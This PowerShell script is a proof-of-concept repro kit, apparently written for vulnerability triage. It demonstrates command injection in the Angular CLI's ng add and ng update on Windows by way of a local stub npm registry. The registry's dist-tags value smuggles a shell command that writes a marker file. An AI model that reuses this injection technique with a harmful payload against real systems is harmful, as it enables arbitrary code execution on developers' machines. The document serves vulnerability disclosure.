# W1 TRiAGER REPRO KIT — one command on any Windows machine
# Usage:  powershell -ExecutionPolicy Bypass -File w1-repro-triager.ps1
# Prereqs: Node 18+ (with npm on PATH), git not required.
# Optional for the yarn-classic path: yarn 1.x (npm i -g yarn@1). If yarn 2+ or missing,
# the script falls back to the ng update path (manager-independent, npm default).
$ErrorActionPreference = 'Stop'
$here = Split-Path -Parent $MyInvocation.MyCommand.Path
$fixture = Join-Path $here 'malrepo'
$marker = Join-Path $env:TEMP 'w1-poc'
Remove-Item $marker -ErrorAction SilentlyContinue

# 1. Start the malicious registry stub (serves dist-tags.latest = 1.0.0" & echo ...)
$reg = Join-Path $here 'registry-server.cjs'
$regProc = Start-Process -FilePath 'node' -ArgumentList @($reg, '4873') -PassThru -NoNewWindow
Start-Sleep -Seconds 1

try {
  Write-Host '=== W1 repro: metadata-fetch command injection (win32 shell:string) ==='
  Write-Host ('registry  : http://127.0.0.1:4873  (stub serves: dist-tags.latest = 1.0.0" & echo W1-MARKER > %TEMP%\w1-poc & ")')
  Write-Host ('fixture   : ' + $fixture)

  # 2. Which path are we on? yarn 1 present => ng add path (yarn-classic). Else => ng update path (npm default, manager-independent).
  $useYarn = $false
  try { $yv = (yarn --version 2>$null); if ($yv -and [version]$yv -lt [version]'2.0.0') { $useYarn = $true } } catch {}
  Write-Host ('pm        : ' + $(if ($useYarn) { 'yarn ' + $yv + ' (classic) -> ng add path' } else { 'npm default -> ng update path (manager-independent)' }))

  Push-Location $fixture
  if ($useYarn) {
    # ng add: the metadata fetch (loadPackageInfoTask) runs BEFORE the confirmation gate.
    # --skip-confirmation only skips the install gate; the injection fires during the fetch.
    Write-Host '>> npx -y @angular/cli@latest add w1-poc-pkg --skip-confirmation'
    npx -y "@angular/cli@latest" add w1-poc-pkg --skip-confirmation 2>&1 | Out-Host
  } else {
    # ng update: no confirmation gate at all; version-check fetch fires first (cli-version.ts),
    # then the update-resolver dist-tags fetch. Manager-independent (npm default).
    Write-Host '>> npx -y @angular/cli@latest update w1-poc-pkg'
    npx -y "@angular/cli@latest" update w1-poc-pkg 2>&1 | Out-Host
  }
  Pop-Location
} finally {
  Write-Host ''
  if (Test-Path $marker) {
    Write-Host ("RESULT: EXECUTION-OBSERVED - marker created at " + $marker + " (content: " + ((Get-Content $marker -Raw).Trim()) + ")")
    Write-Host 'The injected command ran via cmd.exe (shell:true) BEFORE any install/confirmation gate.'
  } else {
    Write-Host 'RESULT: MARKER ABSENT - the injection did not fire on this machine. Check:'
    Write-Host '  1) yarn 1 present for the ng add path (npm i -g yarn@1), or use the ng update path'
    Write-Host '  2) the registry stub is reachable (http://127.0.0.1:4873)'
    Write-Host '  3) no proxy/AV blocked the npx download'
  }
  Stop-Process -Id $regProc.Id -Force -ErrorAction SilentlyContinue
  Write-Host 'cleanup: registry stopped. Marker left at %TEMP%\w1-poc (delete after recording).'
}
